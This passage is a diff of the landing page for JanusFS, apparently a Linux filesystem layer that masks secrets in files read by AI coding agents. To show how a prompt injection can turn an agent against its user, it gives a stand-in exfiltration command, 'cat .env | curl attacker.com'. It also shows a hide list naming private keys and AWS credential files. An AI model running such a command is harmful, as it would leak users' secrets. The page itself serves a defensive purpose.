+      <div style="border:1px solid #1C1F24;border-radius:14px;background:#0E1013;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.5)">
+        <div style="display:flex;align-items:center;justify-content:space-between;gap:12px;padding:11px 14px;border-bottom:1px solid #1C1F24;background:#101216;flex-wrap:wrap">
+          <span style="font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:#6F6B64">agent's view of ./my-project</span>
+          <span style="font-family:'IBM Plex Mono',monospace;font-size:10.5px;letter-spacing:.1em;color:#6F6B64">HIDDEN &gt; MASKED &gt; ALLOWED</span>
+        </div>
+        <div id="file-list" style="display:flex;flex-direction:column">
+          <div class="file-row" data-idx="0" style="display:flex;align-items:center;gap:12px;padding:13px 16px;cursor:pointer;border-bottom:1px solid #15181C;background:transparent">
+            <span style="width:8px;height:8px;border-radius:50%;flex:none;background:#6BCB8B"></span>
+            <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#DAD6CE;flex:none">src/main.go</code>
+            <span style="font-size:11.5px;color:#6F6B64;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">native passthrough — real bytes</span>
+            <span style="margin-left:auto;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.1em;text-transform:uppercase;padding:3px 8px;border-radius:999px;flex:none;color:#6BCB8B;border:1px solid #6BCB8B">allowed</span>
           </div>
-          <p class="hint">one static binary, Linux amd64 &amp; arm64, no cgo &#8212; <a href="https://github.com/sarathsp06/janusfs#quickstart">all install methods &#8594;</a></p>
-        </div>
-      </div>
-
-      <!-- the characteristic artifact: one source tree, the agent's masked view -->
-      <div class="view" role="img" aria-label="An agent's view of a source tree: source files pass through allowed, a dotenv and a config file are masked, a private key and the aws credentials are hidden. Reading the masked dotenv yields API_KEY equals asterisks.">
-        <div class="view-top">
-          <span class="tl"><i></i><i></i><i></i></span>
-          agent's view of ./my-project
-          <span class="count">HIDDEN &gt; MASKED &gt; ALLOWED</span>
-        </div>
-        <div class="row s-allowed">
-          <span class="g">&#10003;</span>
-          <span><span class="name">src/main.go</span><span class="desc">native passthrough — real bytes</span></span>
-          <span class="tag">allowed</span>
-        </div>
-        <div class="row s-masked">
-          <span class="g">&#9680;</span>
-          <span><span class="name">.env</span><span class="desc">env-value redacted — real size kept</span></span>
-          <span class="tag">masked</span>
-        </div>
-        <div class="row s-masked">
-          <span class="g">&#9680;</span>
-          <span><span class="name">config/app.yaml</span><span class="desc">db-uri, generic-secret redacted</span></span>
-          <span class="tag">masked</span>
-        </div>
-        <div class="row s-hidden">
-          <span class="g">&#9679;</span>
-          <span><span class="name">id_rsa</span><span class="desc">fails closed — EACCES</span></span>
-          <span class="tag">hidden</span>
-        </div>
-        <div class="row s-hidden">
-          <span class="g">&#9679;</span>
-          <span><span class="name">.aws/credentials</span><span class="desc">fails closed — EACCES</span></span>
-          <span class="tag">hidden</span>
-        </div>
-        <div class="view-cat">
-          <div><span class="p">$</span> cat .env</div>
-          <div>API_KEY=<span class="mask">****************************</span></div>
-          <div><span class="p">$</span> cat id_rsa</div>
-          <div><span class="deny">cat: id_rsa: Permission denied</span></div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ===================== WHY IT EXISTS ===================== -->
-  <section id="why">
-    <div class="wrap">
-      <p class="kicker">why it exists</p>
-      <h2>Every sandbox asks one question:<br />allow, or deny. Both answers are wrong.</h2>
-      <p class="sub">A file with a secret <em>inside</em> it has no good binary answer. Deny it and the agent that needed the file&#39;s shape breaks; allow it and the secret lands in the model&#39;s context. That dilemma is why agents either stall or over-share &#8212; and it&#39;s the gap JanusFS fills, one layer down at the filesystem.</p>
-
-      <div class="dilemma">
-        <div class="door bad">
-          <span class="lead">answer 1 &#183; deny</span>
-          <h3>Block the file</h3>
-          <p>A deny rule, Landlock, an <code>.aiexclude</code>. The secret is safe &#8212; but the agent that needed that config value, that fixture, that file&#39;s shape now fails, loops, or hallucinates around the hole.</p>
-          <span class="verdict">&#10007; the agent breaks</span>
-        </div>
-        <div class="door bad">
-          <span class="lead">answer 2 &#183; allow</span>
-          <h3>Hand it over</h3>
-          <p>Let it read the file so it can work. Now the secret sits in the context window, the transcript, the provider&#39;s logs &#8212; and one prompt injection turns <code>cat .env</code> into <code>curl attacker.com</code>.</p>
-          <span class="verdict">&#10007; the secret leaks</span>
-        </div>
-        <div class="door win">
-          <span class="lead">janusfs &#183; the third answer</span>
-          <h3>Show a masked face</h3>
-          <p>The file lists at its real size and reads back with only the secret spans replaced by <code>*</code>, byte-for-byte. The agent gets the shape and the safe content; the secret never enters. Truly forbidden files still fail closed.</p>
-          <span class="verdict">&#10003; the agent works, the secret stays</span>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- ===================== MENTAL MODEL ===================== -->
-  <section id="model">
-    <div class="wrap">
-      <p class="kicker">the mental model</p>
-      <h2>Three faces per file,<br />resolved per read, failing closed.</h2>
-      <p class="sub">
-        When an agent opens, reads, or lists a file, JanusFS resolves exactly one decision against a
-        compiled policy snapshot. Precedence is strict, and any parser error, cache fault, or redactor
-        panic resolves the path to Hidden — never raw bytes. The colours below mean exactly one thing
-        wherever they appear on this page.
-      </p>
-      <div class="legend">
-        <span class="chip a"><i></i> allowed — native passthrough to disk</span>
-        <span class="chip m"><i></i> masked — secret spans redacted byte-for-byte</span>
-        <span class="chip h"><i></i> hidden — fails closed with EACCES</span>
-      </div>
-
-      <div class="flow">
-        <div class="node">
-          <b>rules</b>
-          <span>Compile <code style="font-family:var(--mono)">.janusfs.yml</code> globs + pattern library.</span>
-        </div>
-        <div class="link">&#8594;</div>
-        <div class="node">
-          <b>engine</b>
-          <span>Resolve a Decision behind an atomic, immutable snapshot.</span>
-        </div>
-        <div class="link">&#8594;</div>
-        <div class="node">
-          <b>provider</b>
-          <span>Serve redacted bytes from a RAM cache — never disk.</span>
-        </div>
-        <div class="link">&#8594;</div>
-        <div class="node">
-          <b>mount</b>
-          <span>Translate the Decision into a kernel answer over FUSE.</span>
-        </div>
-      </div>
-      <p class="sub" style="margin-top:22px">
-        There is no file watcher. Every masked read revalidates the real file's
-        <code style="font-family:var(--mono);color:var(--paper-2)">(mtime, size, inode)</code> before serving,
-        so a concurrent edit is always caught — the read-time cache key is the authoritative change detector.
-      </p>
-    </div>
-  </section>
-
-  <!-- ===================== WHAT IT DOES ===================== -->
-  <section id="does">
-    <div class="wrap">
-      <p class="kicker">what it does</p>
-      <h2>Keep secret bytes out of the agent&#39;s context.</h2>
-      <p class="sub">Not the machine — the model&#39;s eyes. Redact spans inside otherwise-useful files, at the filesystem boundary, through one code path that fails closed on any error.</p>
-
-      <div class="bento">
-        <div class="cell hero-cell">
-          <div>
-            <h3>Masked, not just allow/deny</h3>
-            <p><code>allow</code> passes through, <code>hide</code> fails closed with <code>EACCES</code>, and <code>mask</code> replaces secret spans byte-for-byte with <code>*</code> — so file sizes and offsets never change and tooling stays intact. Precedence is strict: <code>Hidden &gt; Masked &gt; Allowed</code>.</p>
+          <div class="file-row" data-idx="1" style="display:flex;align-items:center;gap:12px;padding:13px 16px;cursor:pointer;border-bottom:1px solid #15181C;background:transparent">
+            <span style="width:8px;height:8px;border-radius:50%;flex:none;background:#E8B341"></span>
+            <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#DAD6CE;flex:none">.env</code>
+            <span style="font-size:11.5px;color:#6F6B64;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">env-value redacted — real size kept</span>
+            <span style="margin-left:auto;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.1em;text-transform:uppercase;padding:3px 8px;border-radius:999px;flex:none;color:#E8B341;border:1px solid #E8B341">masked</span>
           </div>
-          <div class="miniview" aria-hidden="true">
-            <div><i style="background:var(--allowed)"></i> src/main.go — passthrough</div>
-            <div><i style="background:var(--masked)"></i> .env — API_KEY=****</div>
-            <div><i style="background:var(--hidden)"></i> id_rsa — EACCES</div>
+          <div class="file-row" data-idx="2" style="display:flex;align-items:center;gap:12px;padding:13px 16px;cursor:pointer;border-bottom:1px solid #15181C;background:transparent">
+            <span style="width:8px;height:8px;border-radius:50%;flex:none;background:#E8B341"></span>
+            <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#DAD6CE;flex:none">config/app.yaml</code>
+            <span style="font-size:11.5px;color:#6F6B64;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">db-uri, generic-secret redacted</span>
+            <span style="margin-left:auto;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.1em;text-transform:uppercase;padding:3px 8px;border-radius:999px;flex:none;color:#E8B341;border:1px solid #E8B341">masked</span>
+          </div>
+          <div class="file-row" data-idx="3" style="display:flex;align-items:center;gap:12px;padding:13px 16px;cursor:pointer;border-bottom:1px solid #15181C;background:transparent">
+            <span style="width:8px;height:8px;border-radius:50%;flex:none;background:#E2564B"></span>
+            <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#DAD6CE;flex:none">id_rsa</code>
+            <span style="font-size:11.5px;color:#6F6B64;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">fails closed — EACCES</span>
+            <span style="margin-left:auto;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.1em;text-transform:uppercase;padding:3px 8px;border-radius:999px;flex:none;color:#E2564B;border:1px solid #E2564B">hidden</span>
+          </div>
+          <div class="file-row" data-idx="4" style="display:flex;align-items:center;gap:12px;padding:13px 16px;cursor:pointer;border-bottom:1px solid #15181C;background:transparent">
+            <span style="width:8px;height:8px;border-radius:50%;flex:none;background:#E2564B"></span>
+            <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#DAD6CE;flex:none">.aws/credentials</code>
+            <span style="font-size:11.5px;color:#6F6B64;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">fails closed — EACCES</span>
+            <span style="margin-left:auto;font-family:'IBM Plex Mono',monospace;font-size:10px;letter-spacing:.1em;text-transform:uppercase;padding:3px 8px;border-radius:999px;flex:none;color:#E2564B;border:1px solid #E2564B">hidden</span>
           </div>
         </div>
-        <div class="cell third">
-          <p class="lead">janusfs exec</p>
-          <h3>Kernel-enforced boundary</h3>
-          <p>Runs the whole process tree in a private mount namespace where the filtered view <em>replaces</em> the source at its own path. <code>git</code>, <code>npm</code>, <code>grep</code>, every child inherit it — no child can reach the raw tree.</p>
+        <div style="padding:18px 16px 22px;background:#0A0B0D;font-family:'IBM Plex Mono',monospace;font-size:13px;min-height:132px">
+          <div id="cat-path" style="color:#6BCB8B">$ cat .env</div>
+          <pre id="cat-out" style="margin:10px 0 0;color:#E8B341;white-space:pre-wrap;word-break:break-all;font-family:'IBM Plex Mono',monospace;font-size:13px;line-height:1.55">API_KEY=****************************</pre>
         </div>
-        <div class="cell third">
-          <p class="lead">--net=none</p>
-          <h3>A second layer: network isolation</h3>
-          <p>Masking keeps secret bytes <em>out</em>; <code>--net=none</code> makes sure whatever the agent did read has <em>nowhere to go</em>. It runs the process tree with only loopback and no external route — deny-all, kernel-enforced. Default is <code>host</code>; opt in per run or via settings.</p>
-        </div>
-        <div class="cell wide">
-          <p class="lead">one config</p>
-          <h3>A <code>.janusfs.yml</code> you already understand</h3>
-          <p><code>.gitignore</code>-style globs plus a named pattern library — <code>env-value</code>, <code>aws-key</code>, <code>jwt</code>, <code>github-token</code>, <code>private-key</code>, <code>db-uri</code>&#8230; Machine-wide defaults live in <code>~/.janusfs/config/</code> as a fail-closed floor.</p>
-        </div>
-        <div class="cell third">
-          <p class="lead">daemon + dashboard</p>
-          <h3>One process owns every mount</h3>
-          <p>A background daemon resumes mounts after a reboot and serves one dashboard at <code>127.0.0.1:7381</code>. CLI commands are short-lived clients that return at once.</p>
-        </div>
+      </div>
+    </div>
+
+    <div style="display:flex;gap:26px;flex-wrap:wrap;margin:clamp(40px,6vw,72px) 0 0;padding-top:26px;border-top:1px solid #15181C">
+      <div style="display:flex;align-items:center;gap:9px;font-size:13px;color:#9A968E">
+        <span style="width:9px;height:9px;border-radius:50%;background:#6BCB8B"></span>
+        <strong style="color:#6BCB8B;font-family:'IBM Plex Mono',monospace;font-weight:500;font-size:12.5px">allowed</strong>native passthrough to disk
+      </div>
+      <div style="display:flex;align-items:center;gap:9px;font-size:13px;color:#9A968E">
+        <span style="width:9px;height:9px;border-radius:50%;background:#E8B341"></span>
+        <strong style="color:#E8B341;font-family:'IBM Plex Mono',monospace;font-weight:500;font-size:12.5px">masked</strong>secret spans redacted byte-for-byte
+      </div>
+      <div style="display:flex;align-items:center;gap:9px;font-size:13px;color:#9A968E">
+        <span style="width:9px;height:9px;border-radius:50%;background:#E2564B"></span>
+        <strong style="color:#E2564B;font-family:'IBM Plex Mono',monospace;font-weight:500;font-size:12.5px">hidden</strong>fails closed with EACCES
       </div>
     </div>
   </section>
 
-  <!-- ===================== USE CASES ===================== -->
-  <section id="uses">
-    <div class="wrap">
-      <p class="kicker">use cases</p>
-      <h2>Point it at a directory.<br />Run anything against the mirror.</h2>
-      <p class="sub">Because it&#39;s a filesystem, whatever reads files works unchanged — the agent, its shell, <code style="font-family:var(--mono);color:var(--paper-2)">git</code>, the build, an MCP server. You don&#39;t wire JanusFS into your tool; you run your tool inside JanusFS.</p>
+  <section id="why" style="max-width:1180px;margin:0 auto;padding:clamp(72px,10vw,128px) 24px 0">
+    <p style="font-family:'IBM Plex Mono',monospace;font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;color:#E8B341;margin:0">why it exists</p>
+    <h2 style="font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:clamp(30px,4.2vw,48px);line-height:1.08;letter-spacing:-.03em;margin:16px 0 0;max-width:22ch;text-wrap:balance">Every sandbox asks one question: allow, or deny. Both answers are wrong.</h2>
+    <p style="font-size:17px;line-height:1.65;color:#A8A49C;max-width:62ch;margin:20px 0 0;text-wrap:pretty">A file with a secret <em>inside</em> it has no good binary answer. Deny it and the agent that needed the file's shape breaks; allow it and the secret lands in the model's context. That dilemma is why agents either stall or over-share — and it's the gap JanusFS fills, one layer down at the filesystem.</p>
 
-      <div class="steps" style="margin-top:34px">
-        <div class="step">
-          <h3>Run a coding agent on a secret-laden repo</h3>
-          <p>aider, Claude Code, Codex, Cursor — they read your source and reason about it, but <code>.env</code> values and API tokens read back as <code>****</code> and private keys fail closed. Every child process inherits the view; nothing to wire per tool.</p>
-<pre class="code"><span class="k">janusfs exec</span> -- aider</pre>
-        </div>
-        <div class="step">
-          <h3>Cut the exfiltration path</h3>
-          <p>Masking keeps secret bytes out of the agent; <code>--net=none</code> keeps whatever it <em>did</em> read from leaving the box — loopback only, no route out, kernel-enforced.</p>
-<pre class="code"><span class="k">janusfs exec</span> --net=none -- claude</pre>
-        </div>
-        <div class="step">
-          <h3>A persistent masked mirror for any tool</h3>
-          <p>Hand a long-lived mountpoint to an MCP server, a code indexer, a REPL, or a teammate&#39;s script — point the tool at the mount instead of the source. The daemon owns it and remounts after a reboot.</p>
-<pre class="code"><span class="k">janusfs daemon</span> --background
-<span class="k">janusfs mount</span> .
-cd "$(<span class="k">janusfs path</span> .)"</pre>
-        </div>
-        <div class="step">
-          <h3>Audit before you trust it</h3>
-          <p>See exactly what an agent would read — every likely-secret still Allowed, and why any single path resolves the way it does — before you run anything against it.</p>
-<pre class="code"><span class="k">janusfs check</span> --secrets
-<span class="k">janusfs explain</span> .env</pre>
-        </div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,290px),1fr));gap:16px;margin-top:42px">
+      <div style="border:1px solid #241C1B;background:#100D0D;border-radius:13px;padding:24px">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#E2564B;margin:0">answer 1 · deny</p>
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:22px;font-weight:600;letter-spacing:-.02em;margin:14px 0 10px">Block the file</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0">A deny rule, Landlock, an <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#DAD6CE">.aiexclude</code>. The secret is safe — but the agent that needed that config value, that fixture, that file's shape now fails, loops, or hallucinates around the hole.</p>
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#E2564B;margin:20px 0 0">&#10007; the agent breaks</p>
+      </div>
+      <div style="border:1px solid #241C1B;background:#100D0D;border-radius:13px;padding:24px">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#E2564B;margin:0">answer 2 · allow</p>
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:22px;font-weight:600;letter-spacing:-.02em;margin:14px 0 10px">Hand it over</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#A8A49C;margin:0">Let it read the file so it can work. Now the secret sits in the context window, the transcript, the provider's logs — and one prompt injection turns <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#DAD6CE">cat .env</code> into <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#DAD6CE">curl attacker.com</code>.</p>
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#E2564B;margin:20px 0 0">&#10007; the secret leaks</p>
+      </div>
+      <div style="border:1px solid #3A3220;background:#14110B;border-radius:13px;padding:24px;position:relative">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:#E8B341;margin:0">janusfs · the third answer</p>
+        <h3 style="font-family:'Space Grotesk',sans-serif;font-size:22px;font-weight:600;letter-spacing:-.02em;margin:14px 0 10px;color:#F2E9D6">Show a masked face</h3>
+        <p style="font-size:14.5px;line-height:1.6;color:#BDB6A6;margin:0">The file lists at its real size and reads back with only the secret spans replaced by <code style="font-family:'IBM Plex Mono',monospace;font-size:13px;color:#E8B341">*</code>, byte-for-byte. The agent gets the shape and the safe content; the secret never enters. Truly forbidden files still fail closed.</p>
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:#6BCB8B;margin:20px 0 0">&#10003; the agent works, the secret stays</p>
       </div>
     </div>
   </section>
 
-  <!-- ===================== ENFORCEMENT ===================== -->
-  <section id="enforce">
-    <div class="wrap">
-      <p class="kicker">enforcement</p>
-      <h2>Own the process tree, not one channel.</h2>
-      <p class="sub">
-        Pointing an agent <em>at</em> a mountpoint is only as good as the agent&#39;s discipline — nothing stops a
-        process from reaching the real source at its own path. <code style="font-family:var(--mono);color:var(--paper-2)">janusfs exec</code>
-        confines the entire subprocess tree at once: its <code style="font-family:var(--mono);color:var(--paper-2)">read_file</code> tool, its
-        Bash tool, <code style="font-family:var(--mono);color:var(--paper-2)">git</code>, a build, a subprocess — all inherit the filtered view,
-        with no per-tool wiring and no way to opt out. No daemon required.
-      </p>
+  <section id="faces" style="max-width:1180px;margin:0 auto;padding:clamp(72px,10vw,128px) 24px 0">
+    <p style="font-family:'IBM Plex Mono',monospace;font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;color:#E8B341;margin:0">the three faces</p>
+    <h2 style="font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:clamp(30px,4.2vw,48px);line-height:1.08;letter-spacing:-.03em;margin:16px 0 0;max-width:24ch;text-wrap:balance">What each decision does to a read.</h2>
+    <p style="font-size:17px;line-height:1.65;color:#A8A49C;max-width:62ch;margin:20px 0 0;text-wrap:pretty">Every file still <em>lists</em> with its real size — masking preserves byte length, so <code style="font-family:'IBM Plex Mono',monospace;font-size:15px;color:#DAD6CE">getattr</code> and offsets are identical whether or not a span is redacted. One <code style="font-family:'IBM Plex Mono',monospace;font-size:15px;color:#DAD6CE">.janusfs.yml</code> drives all three.</p>
 
-<pre class="code" style="margin-top:30px;max-width:760px"><span class="k">janusfs exec</span> -- aider              <span class="c"># masked tree, host network</span>
-<span class="k">janusfs exec</span> --net=none -- aider   <span class="c"># masked tree + no network at all (loopback only)</span>
-<span class="k">janusfs exec</span> --net=host -- claude  <span class="c"># default: share the host network (no isolation)</span></pre>
-
-      <p class="callout">
-        <b>Why not just a sandbox?</b> A sandbox protects the <em>machine</em> from the agent; JanusFS keeps secret
-        <em>bytes</em> out of the agent&#39;s context, transcript, and model provider. Deny <code>.env</code> under Landlock
-        and the agent breaks when it needs the file&#39;s shape; allow it, and one prompt injection later
-        <code>cat .env | curl attacker.com</code> exfiltrates it. Run both: the sandbox denies the machine, JanusFS masks the secrets.
-      </p>
-
-      <p class="callout danger">
-        <b>Non-Linux is refused, not faked.</b> <code>janusfs mount</code> and <code>janusfs exec</code> error out on macOS
-        and Windows rather than pretend an advisory mount is a boundary. To use JanusFS on a Mac, run the agent
-        in a Linux container/VM started with <code>--device /dev/fuse --cap-add SYS_ADMIN</code> and use <code>janusfs exec</code> inside it.
-      </p>
-
-      <p class="callout">
-        <b>One caveat, warned loudly.</b> Because <code>.git/</code> passes through to the real object store, <code>git add</code>
-        on a masked file stages the <code>****</code> bytes. <code>janusfs check</code> and <code>janusfs exec</code> both report every
-        masked file git would stage — keep secret files out of the agent&#39;s commits, or give it a scratch clone.
-      </p>
-    </div>
-  </section>
-
-  <!-- ===================== THE THREE FACES ===================== -->
-  <section id="faces">
-    <div class="wrap">
-      <p class="kicker">the three faces</p>
-      <h2>What each decision does to a read.</h2>
-      <p class="sub">Every file still <em>lists</em> with its real size — masking preserves byte length, so <code style="font-family:var(--mono);color:var(--paper-2)">getattr</code> and offsets are identical whether or not a span is redacted. One <code style="font-family:var(--mono);color:var(--paper-2)">.janusfs.yml</code> drives all three.</p>
-
-      <div class="split">
-        <div class="compare">
-          <div class="scroll">
-            <table>
-              <thead>
-                <tr><th>state</th><th>listing / size</th><th>read</th><th>write</th></tr>
-              </thead>
-              <tbody>
-                <tr><td><span class="a">allowed</span></td><td>yes / real</td><td class="yes">passthrough</td><td class="yes">passthrough</td></tr>
-                <tr><td><span class="m">masked</span></td><td>yes / real</td><td class="part">*-redacted</td><td class="no">EACCES</td></tr>
-                <tr><td><span class="h">hidden</span></td><td>yes / real</td><td class="no">EACCES</td><td class="no">EACCES</td></tr>
-              </tbody>
-            </table>
-          </div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,400px),1fr));gap:20px;margin-top:40px;align-items:start">
+      <div style="border:1px solid #1C1F24;border-radius:13px;overflow:hidden">
+        <div style="display:grid;grid-template-columns:1.1fr 1.2fr 1fr 1fr;gap:16px;font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:#6F6B64;background:#101216;padding:12px 16px">
+          <span>state</span><span>listing / size</span><span>read</span><span>write</span>
         </div>
-<pre class="code"><span class="c"># .janusfs.yml — one file, three concepts</span>
-version: 1
+        <div style="display:grid;grid-template-columns:1.1fr 1.2fr 1fr 1fr;gap:16px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;padding:16px;border-top:1px solid #15181C;align-items:center">
+          <span style="color:#6BCB8B;font-weight:500">allowed</span><span style="color:#A8A49C">yes / real</span><span style="color:#A8A49C">passthrough</span><span style="color:#A8A49C">passthrough</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1.1fr 1.2fr 1fr 1fr;gap:16px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;padding:16px;border-top:1px solid #15181C;align-items:center">
+          <span style="color:#E8B341;font-weight:500">masked</span><span style="color:#A8A49C">yes / real</span><span style="color:#A8A49C">*-redacted</span><span style="color:#A8A49C">EACCES</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1.1fr 1.2fr 1fr 1fr;gap:16px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;padding:16px;border-top:1px solid #15181C;align-items:center">
+          <span style="color:#E2564B;font-weight:500">hidden</span><span style="color:#A8A49C">yes / real</span><span style="color:#A8A49C">EACCES</span><span style="color:#A8A49C">EACCES</span>
+        </div>
+        <div style="padding:18px 16px;border-top:1px solid #15181C;background:#0C0E11">
+          <p style="font-size:13.5px;line-height:1.6;color:#9A968E;margin:0"><strong style="color:#E7E4DE">Hierarchical &amp; fail-closed.</strong> Files further down the tree override shallower ones, and <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">allow</code> can re-include a hidden file — but never one under a directory that resolves to Hidden. <code style="font-family:'IBM Plex Mono',monospace;color:#DAD6CE">janusfs explain &lt;path&gt;</code> traces every contributing rule.</p>
+        </div>
+      </div>
 
-<span class="key">hide</span>:
+      <div style="border:1px solid #1C1F24;border-radius:13px;background:#0E1013;overflow:hidden">
+        <div style="padding:11px 16px;border-bottom:1px solid #1C1F24;background:#101216;font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:#6F6B64">.janusfs.yml — one file, three concepts</div>
+        <pre style="margin:0;padding:18px 16px;overflow-x:auto;font-family:'IBM Plex Mono',monospace;font-size:12.5px;line-height:1.7;color:#C9C5BD">version: 1
+
+<span style="color:#E2564B">hide:</span>
   - "*.pem"
   - id_rsa*
   - .aws/credentials
   - node_modules/
 
-<span class="key">allow</span>:
+<span style="color:#6BCB8B">allow:</span>
   - .aws/known_public_config
 
-<span class="key">mask</span>:
+<span style="color:#E8B341">mask:</span>
   - paths: ["*.env*"]
     patterns: [env-value]
   - paths: ["**/*"]
     patterns: [aws-key, github-token, jwt, private-key]
   - paths: ["config/**/*.yaml"]
     patterns: [generic-secret, db-uri]
-  - paths: ["secrets/*"]   <span class="c"># no patterns -> whole-file mask</span></pre>
+  - paths: ["secrets/*"]   <span style="color:#6F6B64"># whole-file mask</span></pre>
       </div>
-
-      <p class="callout">
-        <b>Hierarchical &amp; fail-closed.</b> Files further down the tree override shallower ones, and <code>allow</code>
-        can re-include a hidden file — but never one under a directory that resolves to Hidden, and never a path
-        the machine-wide <code>~/.janusfs/config/</code> floor already hid. <code>janusfs explain &lt;path&gt;</code> traces every
-        contributing rule; <code>janusfs check --secrets</code> flags likely secrets still readable.
-      </p>
     </div>
-  </section>
 
-  <!-- ===================== INSTALL ===================== -->
-  <section id="install">
-    <div class="wrap">
-      <p class="kicker">get running</p>
-      <h2>One command in, masked in a minute.</h2>
-      <p class="sub">JanusFS runs on Linux only. Install the FUSE runtime, drop in the binary, seed a policy, then run your agent inside the boundary — or hand a persistent mount to the daemon.</p>
-
-      <div class="cmd" style="margin-top:26px;max-width:680px">
-        <span class="p">$</span>
-        <code id="cmd-install">curl -fsSL https://raw.githubusercontent.com/sarathsp06/janusfs/main/install.sh | sh</code>
-        <button class="copy" data-copy="cmd-install">Copy</button>
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,250px),1fr));gap:16px;margin-top:20px">
+      <div style="border:1px solid #1C1F24;border-radius:11px;padding:20px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:#E8B341;margin:0">01 — rules</p>
+        <p style="font-size:14px;line-height:1.55;color:#A8A49C;margin:10px 0 0">Compile .janusfs.yml globs + pattern library.</p>
       </div>
-
-      <div class="steps">
-        <div class="step">
-          <h3><span class="n">1</span> Install the FUSE runtime</h3>
-<pre class="code">sudo apt-get install -y fuse3   <span class="c"># Debian/Ubuntu</span>
-<span class="c"># sudo dnf install -y fuse3     # RHEL/Fedora</span></pre>
-        </div>
-        <div class="step">
-          <h3><span class="n">2</span> Seed a policy &amp; preview</h3>
-<pre class="code">cd my-project
-<span class="k">janusfs init</span>              <span class="c"># write .janusfs.yml</span>
-<span class="k">janusfs check</span> --secrets  <span class="c"># warn on readable secrets</span>
-<span class="k">janusfs explain</span> .env     <span class="c"># trace one path's fate</span></pre>
-        </div>
-        <div class="step">
-          <h3><span class="n">3</span> Run the agent inside it</h3>
-<pre class="code"><span class="k">janusfs exec</span> -- aider             <span class="c"># kernel-enforced view</span>
-<span class="k">janusfs exec</span> --net=none -- aider  <span class="c"># …and no network</span></pre>
-        </div>
-        <div class="step">
-          <h3><span class="n">4</span> Or a persistent mount</h3>
-<pre class="code"><span class="k">janusfs daemon</span> --background   <span class="c"># owns every mount, survives reboots</span>
-<span class="k">janusfs mount</span> ~/proj          <span class="c"># hand it off; returns at once</span>
-cd "$(<span class="k">janusfs path</span> ~/proj)"  <span class="c"># cd into the masked view</span>
-<span class="k">janusfs umount</span> ~/proj         <span class="c"># remove · dashboard :7381</span></pre>
-        </div>
+      <div style="border:1px solid #1C1F24;border-radius:11px;padding:20px;background:#0C0E11">
+        <p style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:#E8B341;margin:0">02 — engine</p>
+        <p style="font-size:14px;line-height:1.55;color:#A8A49C;margin:10px 0 0">Resolve a Decision behind an atomic, immutable snapshot.</p>
       </div>
-
-      <p class="callout">
-        <b>Using a persistent mount.</b> Unlike <code>exec</code> (which wraps one process tree), a mount is a real directory <em>any</em> tool can open. <code>janusfs mount &lt;src&gt;</code> hands it to the daemon and returns; the masked view appears at a path mirroring the source under <code>~/.janusfs/mounts/</code>. Read that path with <code>janusfs path &lt;src&gt;</code>, then point a shell, editor, code indexer, or MCP server at it — <code>cd "$(janusfs path &lt;src&gt;)"</code>. <code>janusfs mounts</code> lists them, <code>janusfs umount &lt;src&gt;</code> removes one, and the daemon remounts everything after a reboot.
-      </p>
-
-      <p class="callout danger">
-        <b>On a Mac or Windows?</b> JanusFS enforcement is a Linux kernel feature, so <code>mount</code> and <code>exec</code> refuse on other OSes. Run it inside a Linux container or VM (Docker Desktop, Colima, OrbStack, a devcontainer) started with <code>--device /dev/fuse --cap-add SYS_ADMIN</code>, then use <code>janusfs exec</code> &#8212; or a persistent <code>janusfs mount</code> that container-side tools point at &#8212; in there.
-      </p>
-
-      <p class="callout">
-        <b>Prefer Go?</b> <code>go install github.com/sarathsp06/janusfs/cmd/janusfs@latest</code> builds it from source
-        (Go 1.26+, no cgo). Prebuilt Linux tarballs with <code>checksums.txt</code> are on the
